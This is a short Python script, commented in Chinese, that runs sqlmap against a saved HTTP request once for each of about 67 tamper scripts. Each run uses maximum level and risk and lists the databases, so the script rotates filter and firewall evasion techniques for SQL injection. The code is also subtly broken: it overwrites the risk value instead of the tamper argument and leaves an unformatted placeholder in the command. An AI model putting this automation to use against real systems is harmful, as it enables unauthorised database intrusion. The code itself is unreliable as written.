import os
import subprocess

# sqlmap.py 路径（当前文件夹）
sqlmap_path = './sqlmap.py'

# tamper 脚本文件夹路径（当前文件夹下的 tamper 文件夹）
tamper_folder = './tamper/'

# 存放 tamper 脚本文件名
tamper_scripts = [
    "apostrophemask.py", "apostrophenullencode.py", "appendnullbyte.py", 
    "base64encode.py", "between.py", "binary.py", "bluecoat.py", 
    "chardoubleencode.py", "charencode.py", "charunicodeencode.py", 
    "charunicodeescape.py", "commalesslimit.py", "commalessmid.py", 
    "commentbeforeparentheses.py", "concat2concatws.py", "decentities.py", 
    "dunion.py", "equaltolike.py", "equaltorlike.py", "escapequotes.py", 
    "greatest.py", "halfversionedmorekeywords.py", "hex2char.py", 
    "hexentities.py", "htmlencode.py", "if2case.py", 
    "ifnull2casewhenisnull.py", "ifnull2ifisnull.py", 
    "informationschemacomment.py", "least.py", "lowercase.py", 
    "luanginx.py", "misunion.py", "modsecurityversioned.py", 
    "modsecurityzeroversioned.py", "multiplespaces.py", "ord2ascii.py", 
    "overlongutf8.py", "overlongutf8more.py", "percentage.py", 
    "plus2concat.py", "plus2fnconcat.py", "randomcase.py", 
    "randomcomments.py", "schemasplit.py", "scientific.py", 
    "sleep2getlock.py", "sp_password.py", "space2comment.py", 
    "space2dash.py", "space2hash.py", "space2morecomment.py", 
    "space2morehash.py", "space2mssqlblank.py", "space2mssqlhash.py", 
    "space2mysqlblank.py", "space2mysqldash.py", "space2plus.py", 
    "space2randomblank.py", "substring2leftright.py", 
    "symboliclogical.py", "unionalltounion.py", "unmagicquotes.py", 
    "uppercase.py", "varnish.py", "versionedkeywords.py", 
    "versionedmorekeywords.py", "xforwardedfor.py"
]

# 执行sqlmap的命令模板
sqlmap_command_template = [
    'python3', sqlmap_path, '-r', '1', '--batch', '--level', '5', 
    '--risk', '3', '--dbs', '--tamper={tamper_script}'
]

# 输出目录（当前文件夹）
output_folder = './'

# 轮换执行 tamper 脚本
for tamper_script in tamper_scripts:
    print(f"Running SQLMap with tamper script: {tamper_script}")
    
    # 创建命令
    sqlmap_command = sqlmap_command_template.copy()
    sqlmap_command[8] = tamper_folder + tamper_script  # 完整路径替换tamper脚本
    
    # 构造输出文件名
    output_file = os.path.join(output_folder, f"{tamper_script}_result.txt")
    
    # 执行命令并保存输出到文件
    with open(output_file, 'w') as f:
        result = subprocess.run(sqlmap_command, stdout=f, stderr=subprocess.PIPE, text=True)
        
        if result.stderr:
            print(f"Error occurred while running {tamper_script}: {result.stderr}")

    print(f"Results saved to {output_file}")
